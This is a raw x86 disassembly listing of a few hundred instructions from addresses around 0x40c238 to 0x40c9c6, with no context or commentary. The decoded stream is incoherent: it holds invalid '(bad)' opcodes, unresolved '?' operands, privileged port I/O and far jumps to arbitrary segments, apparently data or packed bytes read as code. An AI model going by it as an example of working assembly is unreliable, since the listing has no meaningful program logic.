  40c238:	ins    DWORD PTR es:[edi],dx
  40c239:	das    
  40c23a:	shr    DWORD PTR ds:0x639c9102,cl
  40c240:	in     al,dx
  40c241:	call   0xf972:0x6a19cd07
  40c248:	call   0x3049c231
  40c24d:	sub    ah,BYTE PTR [edi]
  40c24f:	leave  
  40c250:	clc    
  40c251:	jne    0x40c2af
  40c253:	nop
  40c254:	pop    es
  40c255:	jecxz  0x40c219
  40c257:	jle    0x40c2c7
  40c259:	imul   eax,DWORD PTR [ebx],0xeb0a18cb
  40c25f:	mov    dl,0x25
  40c261:	push   ebx
  40c262:	hlt    
  40c263:	hlt    
  40c264:	xrelease xchg BYTE PTR [ebp-0x2e0db82c],bl
  40c26b:	jl     0x40c250
  40c26d:	cdq    
  40c26e:	xchg   ebx,eax
  40c26f:	or     ah,BYTE PTR [ecx+ecx*2]
  40c272:	sbb    ah,BYTE PTR [ebp+0x6041374b]
  40c278:	adc    eax,0xb2d305e
  40c27d:	nop
  40c27e:	inc    edi
  40c27f:	dec    edx
  40c280:	inc    edi
  40c281:	xor    eax,0x9f64f001
  40c286:	sbb    al,0x16
  40c288:	arpl   WORD PTR [ecx-0x574bb808],bx
  40c28e:	xchg   ebp,eax
  40c28f:	mov    ?,ebx
  40c291:	mov    ebp,0x6040bfad
  40c296:	clc    
  40c297:	fisttp QWORD PTR [ebp+0x54]
  40c29a:	cmp    BYTE PTR ds:0xb074e54,0xda
  40c2a1:	popa   
  40c2a2:	test   eax,0x65c49dd2
  40c2a7:	pop    ss
  40c2a8:	sbb    BYTE PTR [eax],bh
  40c2aa:	xchg   ebp,eax
  40c2ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2ac:	cdq    
  40c2ad:	mov    eax,0xfbf2eb66
  40c2b2:	push   edx
  40c2b3:	aaa    
  40c2b4:	mov    esp,DWORD PTR [ebp+0x31]
  40c2b7:	ds pop edx
  40c2ba:	dec    ebx
  40c2bb:	imul   ebp,esi,0x2e9bbd1
  40c2c1:	pop    eax
  40c2c2:	xchg   DWORD PTR [edx],ecx
  40c2c4:	and    eax,DWORD PTR ds:0x1b100fd5
  40c2ca:	and    al,0xfa
  40c2cc:	inc    ebx
  40c2cd:	jno    0x40c30f
  40c2cf:	cld    
  40c2d0:	iret   
  40c2d1:	aam    0xfb
  40c2d3:	sub    al,BYTE PTR [ebx-0x17]
  40c2d6:	call   0x10eab69
  40c2db:	push   esi
  40c2dc:	xor    DWORD PTR [ecx+0xe],esp
  40c2df:	lds    esp,FWORD PTR [ecx-0x2c90ec4e]
  40c2e5:	out    0x86,eax
  40c2e7:	cmc    
  40c2e8:	sar    esi,0x50
  40c2eb:	mov    ebx,0x985a8de5
  40c2f0:	ficom  WORD PTR ds:0xaecf9790
  40c2f6:	cmp    BYTE PTR [esi],bh
  40c2f8:	into   
  40c2f9:	inc    esi
  40c2fa:	cli    
  40c2fb:	(bad)  
  40c2fc:	jecxz  0x40c312
  40c2fe:	mov    al,0x3
  40c300:	ins    BYTE PTR es:[edi],dx
  40c301:	jecxz  0x40c345
  40c303:	sar    BYTE PTR [esi+eax*8-0x34417d9f],cl
  40c30a:	inc    edi
  40c30b:	mov    bl,0x35
  40c30d:	mov    esi,0xa8eb0150
  40c312:	mov    ds:0x7bc5fdaf,eax
  40c317:	out    0x23,ax
  40c31a:	mov    BYTE PTR [edi],cl
  40c31c:	clc    
  40c31d:	xchg   esi,eax
  40c31e:	vhsubps ymm4,ymm1,YMMWORD PTR [edi-0x3f]
  40c323:	mov    dl,0xd6
  40c325:	sar    edx,1
  40c327:	cmp    eax,0xa26db99e
  40c32c:	int3   
  40c32d:	jecxz  0x40c2e2
  40c32f:	sbb    DWORD PTR ss:[esi-0x54803c6d],0x4a
  40c337:	pop    edx
  40c338:	sub    cl,0xa5
  40c33b:	shl    DWORD PTR ds:0x62a111f3,cl
  40c341:	push   edi
  40c342:	push   ecx
  40c343:	inc    eax
  40c344:	and    eax,ebx
  40c346:	and    eax,0x2c4d6206
  40c34b:	cmp    dh,bl
  40c34d:	cmp    DWORD PTR [ebp+0x29574a09],edx
  40c353:	xor    eax,0x81c9cca1
  40c358:	inc    eax
  40c359:	push   esp
  40c35a:	sbb    eax,0x44e03062
  40c35f:	ds leave 
  40c361:	and    al,0xb1
  40c363:	popa   
  40c364:	dec    esi
  40c365:	mov    ebx,esi
  40c367:	retf   0x1e5c
  40c36a:	pushf  
  40c36b:	scas   al,BYTE PTR es:[edi]
  40c36c:	sahf   
  40c36d:	adc    BYTE PTR [edi],cl
  40c36f:	mov    al,ds:0xd71c2c23
  40c374:	add    BYTE PTR [eax],0xb
  40c377:	sub    DWORD PTR [edx],edi
  40c379:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c37a:	or     bl,bl
  40c37c:	call   0xc06c:0xf5bd0165
  40c383:	inc    ebx
  40c384:	jl     0x40c37b
  40c386:	fwait
  40c387:	je     0x40c347
  40c389:	daa    
  40c38a:	pop    es
  40c38b:	adc    ebp,DWORD PTR [ebx+0x55]
  40c38e:	jge    0x40c3ba
  40c390:	or     DWORD PTR [ebx+0x50d06476],0x342be263
  40c39a:	stos   BYTE PTR es:[edi],al
  40c39b:	in     eax,0x4
  40c39d:	mov    al,ds:0xb89a645c
  40c3a2:	mov    cl,0x81
  40c3a4:	mov    esp,0xffd7b3a9
  40c3a9:	fwait
  40c3aa:	pushf  
  40c3ab:	in     eax,dx
  40c3ac:	mov    eax,ds:0x65d36415
  40c3b1:	cwde   
  40c3b2:	jo     0x40c39d
  40c3b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c3b5:	test   ah,ah
  40c3b7:	in     eax,dx
  40c3b8:	and    ebx,DWORD PTR [eax-0x6d]
  40c3bb:	and    BYTE PTR [edx-0x60],dl
  40c3be:	xor    eax,0x7acb707f
  40c3c3:	shl    ebx,1
  40c3c5:	push   ds
  40c3c6:	push   ebp
  40c3c7:	mov    ebx,0x36d37370
  40c3cc:	pop    eax
  40c3cd:	pusha  
  40c3ce:	outs   dx,BYTE PTR ds:[esi]
  40c3cf:	call   0xf954:0x7fb02385
  40c3d6:	rol    DWORD PTR [edx+ebx*1-0x37],0xdd
  40c3db:	popf   
  40c3dc:	ret    0x9d57
  40c3df:	push   cs
  40c3e0:	nop
  40c3e1:	fistp  QWORD PTR [ecx+0x13]
  40c3e4:	dec    edi
  40c3e5:	sbb    DWORD PTR [eax+edx*8],ebp
  40c3e8:	mov    edx,DWORD PTR [edi]
  40c3ea:	and    cl,0x18
  40c3ed:	inc    edi
  40c3ee:	enter  0xbd74,0xfc
  40c3f2:	jne    0x40c3f1
  40c3f4:	inc    esp
  40c3f5:	jecxz  0x40c417
  40c3f7:	dec    edx
  40c3f8:	xor    edi,0xc5097174
  40c3fe:	adc    DWORD PTR [eax+0x69],ebx
  40c401:	sbb    DWORD PTR [esi+0xc],ecx
  40c404:	pop    edx
  40c405:	dec    esp
  40c406:	cmc    
  40c407:	cdq    
  40c408:	outs   dx,BYTE PTR ds:[esi]
  40c409:	jno    0x40c3b4
  40c40b:	mov    bh,0x40
  40c40d:	in     al,dx
  40c40e:	std    
  40c40f:	fisttp QWORD PTR [ecx]
  40c411:	xchg   ecx,eax
  40c412:	inc    esi
  40c413:	inc    esi
  40c414:	ins    DWORD PTR es:[edi],dx
  40c415:	fmul   st(0),st
  40c417:	jmp    ebp
  40c419:	popf   
  40c41a:	enter  0xea31,0xc6
  40c41e:	adc    bl,BYTE PTR [eax-0x659b4ce3]
  40c424:	mov    eax,ds:0x1eeeefdd
  40c429:	aad    0x23
  40c42b:	ins    DWORD PTR es:[edi],dx
  40c42c:	cmp    BYTE PTR [edx+0x59],0xb
  40c430:	jnp    0x40c3b2
  40c432:	pop    ds
  40c433:	int    0x6d
  40c435:	pusha  
  40c436:	xchg   edx,eax
  40c437:	add    ebp,esi
  40c439:	ret    0x9e97
  40c43c:	xlat   BYTE PTR ds:[ebx]
  40c43d:	outs   dx,BYTE PTR ds:[esi]
  40c43e:	shl    eax,0xfd
  40c441:	xchg   edi,eax
  40c442:	pushf  
  40c443:	mov    ebx,0x540b6d41
  40c448:	or     dl,BYTE PTR [ebp+edx*4+0x3862a051]
  40c44f:	ss ret 
  40c451:	ror    DWORD PTR [ecx-0x13],0x98
  40c455:	js     0x40c3e6
  40c457:	loope  0x40c4bf
  40c459:	add    al,0x8a
  40c45b:	xor    ecx,ecx
  40c45d:	sub    bl,BYTE PTR [eax+edi*2+0x2b343be7]
  40c464:	sub    al,0x7e
  40c466:	inc    ebp
  40c467:	dec    edx
  40c468:	sbb    dl,BYTE PTR [ebx+esi*2+0x36]
  40c46c:	sbb    esp,ebp
  40c46e:	cld    
  40c46f:	das    
  40c470:	mov    esi,0xee9df093
  40c475:	jmp    0x2946:0xef8e9bad
  40c47c:	iret   
  40c47d:	xor    DWORD PTR [ecx+0x5efa8c75],ebp
  40c483:	das    
  40c484:	retf   0x46bf
  40c487:	shr    BYTE PTR [ecx+0x2b577336],1
  40c48d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c48e:	sub    esi,DWORD PTR [eax-0x64ae6d4b]
  40c494:	inc    edx
  40c495:	pop    esp
  40c496:	dec    edx
  40c497:	push   cs
  40c498:	mov    ch,0xec
  40c49a:	adc    DWORD PTR [edx],eax
  40c49c:	sbb    DWORD PTR [ecx+eax*1-0x160b15b4],ecx
  40c4a3:	add    dh,cl
  40c4a5:	not    BYTE PTR [ebp-0x44]
  40c4a8:	push   ebx
  40c4a9:	and    DWORD PTR [edx-0x18],esp
  40c4ac:	push   esi
  40c4ad:	mov    ds:0x6e379c37,eax
  40c4b2:	add    BYTE PTR [esi-0x4],bh
  40c4b5:	dec    esi
  40c4b6:	mov    BYTE PTR [eax],al
  40c4b8:	mov    ch,0xbd
  40c4ba:	sti    
  40c4bb:	jmp    0x77c9:0xfed9e6aa
  40c4c2:	xchg   esp,eax
  40c4c3:	and    bh,ch
  40c4c5:	push   esp
  40c4c6:	xchg   edx,eax
  40c4c7:	test   eax,0x1adf42b
  40c4cc:	push   edi
  40c4cd:	ds std 
  40c4cf:	data16 jae 0x40c473
  40c4d2:	mov    edi,0x3947160c
  40c4d7:	xchg   edi,eax
  40c4d8:	std    
  40c4d9:	sub    al,0x84
  40c4db:	repz xchg edi,eax
  40c4dd:	pop    edx
  40c4de:	loope  0x40c46c
  40c4e0:	(bad)  
  40c4e1:	ins    BYTE PTR es:[edi],dx
  40c4e2:	popf   
  40c4e3:	cmp    al,0xdf
  40c4e5:	inc    ebp
  40c4e6:	dec    esi
  40c4e7:	mov    WORD PTR [edi+0x6b],?
  40c4ea:	sub    al,0xfa
  40c4ec:	push   0x7122d50f
  40c4f1:	mov    bl,0x17
  40c4f3:	cmp    DWORD PTR [ebx+0x27],esp
  40c4f6:	popf   
  40c4f7:	adc    eax,0x456c4bca
  40c4fc:	adc    DWORD PTR [ecx+eiz*2-0x38ac129a],0x2
  40c504:	adc    DWORD PTR [edi],esp
  40c506:	mov    esp,0xdf581861
  40c50b:	adc    DWORD PTR [edx+0x43],eax
  40c50e:	enter  0xcecc,0x26
  40c512:	dec    esi
  40c513:	iret   
  40c514:	and    edi,DWORD PTR [eax-0x80]
  40c517:	scas   eax,DWORD PTR es:[edi]
  40c518:	pop    ss
  40c519:	ret    0xc141
  40c51c:	mov    ebx,0x3e5d2e6b
  40c521:	add    eax,0x70114cd7
  40c526:	enter  0x5e8e,0x4d
  40c52a:	sub    eax,DWORD PTR [edx]
  40c52c:	inc    eax
  40c52d:	mul    DWORD PTR [esi+0x4e]
  40c530:	dec    edi
  40c531:	mov    eax,ds:0x707e4845
  40c536:	stos   BYTE PTR es:[edi],al
  40c537:	into   
  40c538:	xor    DWORD PTR [edi],0x11
  40c53b:	jbe    0x40c527
  40c53d:	and    edx,DWORD PTR [ecx+0xc]
  40c540:	or     al,0x36
  40c542:	in     eax,0xa4
  40c544:	aas    
  40c545:	ins    DWORD PTR es:[edi],dx
  40c546:	stc    
  40c547:	imul   esi,DWORD PTR [ecx-0x1c3b26ec],0xfffffffa
  40c54e:	push   cs
  40c54f:	stos   BYTE PTR es:[edi],al
  40c550:	jns    0x40c510
  40c552:	mov    ah,0x4f
  40c554:	ret    0xe404
  40c557:	sub    BYTE PTR [ebp+0x2c],al
  40c55a:	cld    
  40c55b:	out    dx,eax
  40c55c:	sub    BYTE PTR [ebx-0x66],al
  40c55f:	sbb    eax,DWORD PTR [ebx-0x77]
  40c562:	ja     0x40c51f
  40c564:	push   0x19
  40c566:	stos   DWORD PTR es:[edi],eax
  40c567:	add    eax,0xdf959da7
  40c56c:	add    al,0x17
  40c56e:	dec    ebx
  40c56f:	test   edi,edx
  40c571:	test   eax,0x48c5f903
  40c576:	cmp    eax,0x3665221a
  40c57b:	push   edi
  40c57c:	lods   al,BYTE PTR ds:[esi]
  40c57d:	int3   
  40c57e:	mov    al,0x1d
  40c580:	imul   ebp,esp,0xbf7bcf1f
  40c586:	cld    
  40c587:	jmp    0xa2b42d65
  40c58c:	mov    ch,0xcd
  40c58e:	dec    esp
  40c58f:	push   ecx
  40c590:	sar    BYTE PTR [ecx+0x6c31dcbc],0x25
  40c597:	in     eax,0x96
  40c599:	ja     0x40c619
  40c59b:	push   edi
  40c59c:	in     eax,0x1f
  40c59e:	push   eax
  40c59f:	das    
  40c5a0:	dec    esi
  40c5a1:	aas    
  40c5a2:	cmc    
  40c5a3:	or     esp,DWORD PTR [edi+0x18ff131f]
  40c5a9:	xchg   esp,eax
  40c5aa:	shl    DWORD PTR [edi+0x62ad271],0x4c
  40c5b1:	or     eax,0x2fcda286
  40c5b6:	mov    bl,0xb9
  40c5b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b9:	jecxz  0x40c612
  40c5bb:	mov    bh,0x6e
  40c5bd:	sbb    BYTE PTR [ebp+0x51],bl
  40c5c0:	mov    ds:0x85ed6fea,al
  40c5c5:	mov    esp,0xf83cbc57
  40c5ca:	inc    edi
  40c5cb:	test   al,0x26
  40c5cd:	ficom  DWORD PTR [esi+0x3f]
  40c5d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c5d1:	sbb    edx,edi
  40c5d3:	mov    eax,ds:0xd0b7ebae
  40c5d8:	ja     0x40c5ca
  40c5da:	dec    ebx
  40c5db:	stc    
  40c5dc:	pop    edx
  40c5dd:	cdq    
  40c5de:	mov    edx,esi
  40c5e0:	inc    eax
  40c5e1:	je     0x40c63c
  40c5e3:	xchg   DWORD PTR [ecx-0x1d],eax
  40c5e6:	xchg   esp,eax
  40c5e7:	xchg   esp,eax
  40c5e8:	push   eax
  40c5e9:	rol    BYTE PTR [ecx-0xa127cf3],1
  40c5ef:	push   esp
  40c5f0:	out    dx,eax
  40c5f1:	stos   DWORD PTR es:[edi],eax
  40c5f2:	jge    0x40c5a5
  40c5f4:	add    eax,DWORD PTR [edi-0x7bf88357]
  40c5fa:	sbb    al,0xe0
  40c5fc:	dec    ecx
  40c5fd:	retf   
  40c5fe:	test   BYTE PTR [ebx-0x74],0x34
  40c602:	mov    esi,eax
  40c604:	mov    esp,0x9bbfd617
  40c609:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c60a:	jecxz  0x40c5b0
  40c60c:	and    bh,ah
  40c60e:	xor    eax,DWORD PTR [eax+eiz*8-0x5a]
  40c612:	push   0x3e6997c5
  40c617:	dec    ebp
  40c618:	or     ah,BYTE PTR [esi+0x2df752a6]
  40c61e:	mov    edi,0x5229ad1e
  40c623:	clc    
  40c624:	adc    edi,esp
  40c626:	and    al,0xcc
  40c628:	ror    DWORD PTR [ecx],0x9d
  40c62b:	push   edx
  40c62c:	fild   DWORD PTR [esi+0x2417736c]
  40c632:	inc    edx
  40c633:	sbb    al,0x88
  40c635:	xlat   BYTE PTR ds:[ebx]
  40c636:	xchg   esp,eax
  40c637:	or     eax,0xb8a9ae05
  40c63c:	mov    eax,0x10d52413
  40c641:	test   DWORD PTR [esi+edx*2],0x71bd84bb
  40c648:	dec    edi
  40c649:	push   edi
  40c64a:	nop
  40c64b:	int3   
  40c64c:	add    eax,esp
  40c64e:	(bad)  
  40c650:	gs mov bl,0xf3
  40c653:	loop   0x40c5f1
  40c655:	xor    bl,BYTE PTR [edx+0x79]
  40c658:	sbb    eax,0x56f7ce38
  40c65d:	and    BYTE PTR [edi-0x4bb57768],dh
  40c663:	ins    DWORD PTR es:[edi],dx
  40c664:	adc    ah,cl
  40c666:	sub    dl,BYTE PTR [edi+0x32907d71]
  40c66c:	sbb    ecx,DWORD PTR [ebx-0x4b]
  40c66f:	adc    ebx,edi
  40c671:	jb     0x40c674
  40c673:	clc    
  40c674:	inc    esi
  40c675:	sbb    eax,0x3ec3adb1
  40c67a:	ror    BYTE PTR [eax+0x46bccb9b],cl
  40c680:	xor    DWORD PTR cs:[ebp-0x24],eax
  40c684:	jmp    0xf5dc1ce2
  40c689:	pop    esp
  40c68a:	out    dx,eax
  40c68b:	dec    eax
  40c68c:	(bad)  [ebx-0x58]
  40c68f:	or     al,0xd4
  40c691:	cdq    
  40c692:	jle    0x40c69f
  40c694:	sub    eax,0x8435866e
  40c699:	(bad)  
  40c69a:	push   0x7c
  40c69c:	push   0x7fe551c3
  40c6a1:	cmp    BYTE PTR [ebx+0x3d],al
  40c6a4:	mov    ?,WORD PTR [ecx]
  40c6a6:	aas    
  40c6a7:	mov    esp,0xc7c18ee8
  40c6ac:	les    ebp,FWORD PTR [edi-0x1c]
  40c6af:	fwait
  40c6b0:	cmp    ebx,ebx
  40c6b2:	mov    DWORD PTR [edi+0x61bd0e7b],ecx
  40c6b8:	scas   eax,DWORD PTR es:[edi]
  40c6b9:	push   ecx
  40c6ba:	scas   ax,WORD PTR es:[edi]
  40c6bc:	out    dx,al
  40c6bd:	call   0x4b15e22e
  40c6c2:	lods   eax,DWORD PTR ds:[esi]
  40c6c3:	or     al,0xb2
  40c6c5:	and    BYTE PTR [ecx+0x6b],dl
  40c6c8:	test   esp,ebp
  40c6ca:	jbe    0x40c6a8
  40c6cc:	xchg   DWORD PTR [edx],edx
  40c6ce:	loope  0x40c68f
  40c6d0:	pop    es
  40c6d1:	out    0x26,al
  40c6d3:	and    bh,BYTE PTR [edi]
  40c6d5:	sar    ah,cl
  40c6d7:	adc    cl,ch
  40c6d9:	xchg   BYTE PTR [ebx],ah
  40c6db:	fwait
  40c6dc:	addr16 mov ds:0xef30,al
  40c6e0:	icebp  
  40c6e1:	popf   
  40c6e2:	jmp    0x4fd9:0x606b5760
  40c6e9:	es adc al,0x82
  40c6ec:	mov    dl,0xfd
  40c6ee:	jmp    FWORD PTR [edx-0x761bb7bb]
  40c6f4:	inc    edi
  40c6f5:	mov    esp,DWORD PTR [esi+0x1860b88f]
  40c6fb:	cmp    al,0x93
  40c6fd:	jnp    0x40c6bd
  40c6ff:	mov    dh,0x17
  40c701:	xchg   esi,eax
  40c702:	mov    bh,0x81
  40c704:	mov    BYTE PTR [edi-0x6d],al
  40c707:	or     DWORD PTR [ecx],ecx
  40c709:	stos   DWORD PTR es:[edi],eax
  40c70a:	pushf  
  40c70b:	add    al,0xf6
  40c70d:	push   cs
  40c70e:	push   eax
  40c70f:	test   DWORD PTR [eax+0x58],ebx
  40c712:	mov    edx,0xa7de1d26
  40c717:	xchg   edi,eax
  40c718:	mov    ebx,0xb1dbc2d2
  40c71d:	in     al,dx
  40c71e:	outs   dx,BYTE PTR ds:[esi]
  40c71f:	mov    ebx,0x9108cf36
  40c724:	xor    DWORD PTR [eax+0x1b8bc8cf],edi
  40c72a:	std    
  40c72b:	retf   
  40c72c:	(bad)  
  40c72d:	popa   
  40c72e:	dec    esp
  40c72f:	icebp  
  40c730:	mov    esi,0xdcf1443e
  40c735:	sub    DWORD PTR [ebp-0x24],esp
  40c738:	jmp    0x8933a1b6
  40c73d:	cdq    
  40c73e:	cld    
  40c73f:	inc    edx
  40c740:	call   0x8191:0xc41d23a3
  40c747:	or     DWORD PTR [edx],ebx
  40c749:	mov    dl,BYTE PTR [eax+0x30d4335f]
  40c74f:	enter  0x35f1,0x1a
  40c753:	pop    ss
  40c754:	add    al,BYTE PTR [eax-0x40]
  40c757:	call   0xecd1:0xe3aa6aae
  40c75e:	in     eax,dx
  40c75f:	inc    ebx
  40c760:	aam    0x42
  40c762:	fadd   QWORD PTR [edi+esi*4]
  40c765:	sub    BYTE PTR [edx-0x7b9f727e],ch
  40c76b:	pop    ebx
  40c76c:	(bad)  
  40c76d:	nop
  40c76e:	or     BYTE PTR [ebx+0x5b],cl
  40c771:	push   cs
  40c772:	and    eax,0xa4fb4128
  40c777:	je     0x40c71f
  40c779:	repz jmp 0xeab0:0xa103599c
  40c781:	je     0x40c76c
  40c783:	mov    ebx,0xd804cfea
  40c788:	rcr    eax,0x8e
  40c78b:	aaa    
  40c78c:	xchg   edi,eax
  40c78d:	pop    esp
  40c78e:	add    ecx,DWORD PTR [esi-0x239d3131]
  40c794:	(bad)  [eax+eax*1+0x3ba5a423]
  40c79b:	or     eax,0xf38c0e4d
  40c7a0:	pushf  
  40c7a1:	mov    dl,BYTE PTR [edi+esi*4]
  40c7a4:	jmp    0x40c729
  40c7a6:	out    0xe5,al
  40c7a8:	cmp    dh,al
  40c7aa:	xchg   edi,eax
  40c7ab:	inc    ebp
  40c7ac:	(bad)  
  40c7ad:	ror    DWORD PTR [ecx],1
  40c7af:	lock mov ecx,0xfb72449f
  40c7b5:	test   BYTE PTR [ebx+ebp*1+0x2e2b7e2b],al
  40c7bc:	daa    
  40c7bd:	add    BYTE PTR ds:0x185be72,0x76
  40c7c4:	sub    BYTE PTR [esp+esi*1-0x277c6b54],0x3e
  40c7cc:	sti    
  40c7cd:	jl     0x40c7d3
  40c7cf:	push   ebx
  40c7d0:	adc    ecx,DWORD PTR [esi]
  40c7d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7d3:	jno    0x40c831
  40c7d5:	add    BYTE PTR [ecx+0x51549cc8],dh
  40c7db:	sti    
  40c7dc:	xchg   ebx,eax
  40c7dd:	push   0x2a
  40c7df:	sbb    eax,0x7a2d51eb
  40c7e4:	jmp    FWORD PTR [edx+0x44]
  40c7e7:	jno    0x40c83f
  40c7e9:	push   esp
  40c7ea:	and    al,0x42
  40c7ec:	int3   
  40c7ed:	xor    al,0xd
  40c7ef:	push   0x64
  40c7f1:	mov    bl,0x97
  40c7f3:	les    edx,FWORD PTR [eax-0x2e]
  40c7f6:	mov    dl,0x6e
  40c7f8:	hlt    
  40c7f9:	je     0x40c848
  40c7fb:	mov    esi,0x847ef404
  40c800:	leave  
  40c801:	mov    ?,WORD PTR [eax]
  40c803:	test   eax,0x83cc9f08
  40c808:	adc    cl,bh
  40c80a:	sub    al,0x32
  40c80c:	or     eax,0xeeedfd15
  40c811:	loope  0x40c7a7
  40c813:	test   DWORD PTR [esi],edi
  40c815:	js     0x40c7c3
  40c817:	jmp    0x3312:0x37c681d7
  40c81e:	jecxz  0x40c854
  40c820:	sbb    al,0xd7
  40c822:	cmp    al,BYTE PTR [eax+0x4dbf66f5]
  40c828:	repnz leave 
  40c82a:	jbe    0x40c8a7
  40c82c:	xor    al,0x27
  40c82e:	repz ret 0x5331
  40c832:	xchg   ebx,eax
  40c833:	ja     0x40c7ec
  40c835:	sub    BYTE PTR [ebx],al
  40c837:	loopne 0x40c85c
  40c839:	stc    
  40c83a:	sub    BYTE PTR [ecx+0x514e29f1],ch
  40c840:	fstp   DWORD PTR [esi-0x2a]
  40c843:	fstp   TBYTE PTR [edx]
  40c845:	push   ecx
  40c846:	xor    al,0x21
  40c848:	inc    esp
  40c849:	xchg   esi,eax
  40c84a:	inc    eax
  40c84b:	fisttp QWORD PTR [ebx-0xa61b86f]
  40c851:	loopne 0x40c7f5
  40c853:	sub    edx,esi
  40c855:	hlt    
  40c856:	push   ss
  40c857:	das    
  40c858:	outs   dx,DWORD PTR ds:[esi]
  40c859:	add    BYTE PTR [edi+0xaadbb2b],ch
  40c85f:	mov    al,ds:0x31974c15
  40c864:	and    ebp,ebx
  40c866:	cld    
  40c867:	push   cs
  40c868:	aaa    
  40c869:	daa    
  40c86a:	iret   
  40c86b:	adc    ch,0x4b
  40c86e:	int    0xfb
  40c870:	jne    0x40c8bc
  40c872:	sbb    eax,0x9a39259f
  40c877:	int3   
  40c878:	inc    esi
  40c879:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c87a:	or     al,0xc1
  40c87c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c87d:	test   esp,edi
  40c87f:	ja     0x40c8fc
  40c881:	mov    eax,ds:0xc7713dbf
  40c886:	fisttp WORD PTR [ebp+0x1fcd21b2]
  40c88c:	cld    
  40c88d:	test   eax,0x42d0e2e2
  40c892:	lods   al,BYTE PTR ds:[esi]
  40c893:	mov    ebp,0xdda492a4
  40c898:	jno    0x40c8e5
  40c89a:	mov    dh,0x19
  40c89c:	out    0x59,al
  40c89e:	loop   0x40c8f3
  40c8a0:	call   0x5d05:0x30ad5a31
  40c8a7:	mov    edi,0x34e478d6
  40c8ac:	sub    DWORD PTR [esi],esp
  40c8ae:	mov    BYTE PTR [edx-0x2323584c],dl
  40c8b4:	jl     0x40c91c
  40c8b6:	aaa    
  40c8b7:	add    al,0x48
  40c8b9:	std    
  40c8ba:	adc    cl,BYTE PTR [edx-0x14]
  40c8bd:	rcl    DWORD PTR [esi+0x63],1
  40c8c0:	cmovge ebp,esi
  40c8c3:	int    0x61
  40c8c5:	ins    DWORD PTR es:[edi],dx
  40c8c6:	lahf   
  40c8c7:	out    0x94,eax
  40c8c9:	inc    eax
  40c8ca:	imul   edi,ebp,0x8e50b677
  40c8d0:	loop   0x40c913
  40c8d2:	xchg   edi,eax
  40c8d3:	stos   DWORD PTR es:[edi],eax
  40c8d4:	jne    0x40c930
  40c8d6:	shl    al,1
  40c8d8:	pop    ss
  40c8d9:	aaa    
  40c8da:	and    ah,dl
  40c8dc:	std    
  40c8dd:	mov    WORD PTR [edx+0x4a],gs
  40c8e0:	jmp    0x40c956
  40c8e2:	inc    eax
  40c8e3:	bnd call DWORD PTR [eax]
  40c8e6:	(bad)  
  40c8e7:	lods   eax,DWORD PTR ds:[esi]
  40c8e8:	jns    0x40c8e2
  40c8ea:	and    al,0x8b
  40c8ec:	sub    al,0x68
  40c8ee:	imul   DWORD PTR ds:0x1df557fa
  40c8f4:	or     eax,DWORD PTR [esi+0x6c]
  40c8f7:	mov    BYTE PTR [esi-0x69],0x73
  40c8fb:	ficomp DWORD PTR [ebx-0x38]
  40c8fe:	fs push esi
  40c900:	in     eax,0x6c
  40c902:	dec    esi
  40c903:	jmp    0x40c94f
  40c905:	mov    WORD PTR [esp+eiz*2],es
  40c908:	jb     0x40c963
  40c90a:	repnz xchg ecx,eax
  40c90c:	sub    eax,0x17fa2abf
  40c911:	mov    al,0xc1
  40c913:	xchg   ebp,eax
  40c914:	mov    ah,0x51
  40c916:	sbb    dh,BYTE PTR [edx-0x437688dd]
  40c91c:	jae    0x40c930
  40c91e:	lds    ecx,FWORD PTR [ecx+esi*4-0x3]
  40c922:	imul   eax,ebp,0x7
  40c925:	nop
  40c926:	or     eax,0xe02d21fa
  40c92b:	lock sbb eax,DWORD PTR [eax+esi*8-0x67fa6479]
  40c933:	dec    ebp
  40c934:	sub    al,BYTE PTR [esi-0x1]
  40c937:	popa   
  40c938:	adc    DWORD PTR [eax+0x5a75bf12],esi
  40c93e:	test   eax,0x38024dbc
  40c943:	add    eax,0x1e2e8f6d
  40c948:	fiadd  DWORD PTR [eax]
  40c94a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c94b:	(bad)  
  40c94c:	rol    DWORD PTR es:[edx-0x948d1dc],cl
  40c953:	cld    
  40c954:	mov    BYTE PTR [ebp+ebx*4-0x39382ddc],bl
  40c95b:	sahf   
  40c95c:	dec    ecx
  40c95d:	scas   eax,DWORD PTR es:[edi]
  40c95e:	stos   BYTE PTR es:[edi],al
  40c95f:	dec    ebp
  40c960:	and    bl,BYTE PTR [eax-0xc]
  40c963:	add    dh,dl
  40c965:	vshufps xmm4,xmm7,xmm3,0xa8
  40c96a:	add    BYTE PTR [esi],dh
  40c96c:	xor    BYTE PTR [edx],al
  40c96e:	push   edi
  40c96f:	js     0x40c907
  40c971:	dec    edx
  40c972:	sbb    edi,DWORD PTR [edi-0x6d2ac345]
  40c978:	mov    eax,ds:0xf114ac81
  40c97d:	add    eax,0x2eff479d
  40c982:	xchg   edi,eax
  40c983:	cmp    dh,bl
  40c985:	sub    ah,bh
  40c987:	pop    es
  40c988:	dec    ebp
  40c989:	adc    BYTE PTR [ebx+0x265e2755],bl
  40c98f:	in     eax,dx
  40c990:	add    dl,ah
  40c992:	int    0x5e
  40c994:	pop    ss
  40c995:	gs xchg ebx,eax
  40c997:	out    0x69,al
  40c999:	jo     0x40c989
  40c99b:	aas    
  40c99c:	mov    cl,0x87
  40c99e:	scas   eax,DWORD PTR es:[edi]
  40c99f:	push   cs
  40c9a0:	and    esp,DWORD PTR [ebx]
  40c9a2:	pusha  
  40c9a3:	sbb    eax,0x6c97c9c3
  40c9a8:	and    BYTE PTR [edx+0x7dbfb56c],al
  40c9ae:	cmp    BYTE PTR [eax-0x16],0x57
  40c9b2:	sub    bh,0xe1
  40c9b5:	pop    ebp
  40c9b6:	sbb    al,0x74
  40c9b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9b9:	or     eax,0xd01cd502
  40c9be:	mov    bl,0x69
  40c9c0:	ret    0x55ef
  40c9c3:	mul    BYTE PTR [eax-0x2d]
  40c9c6:	stc    
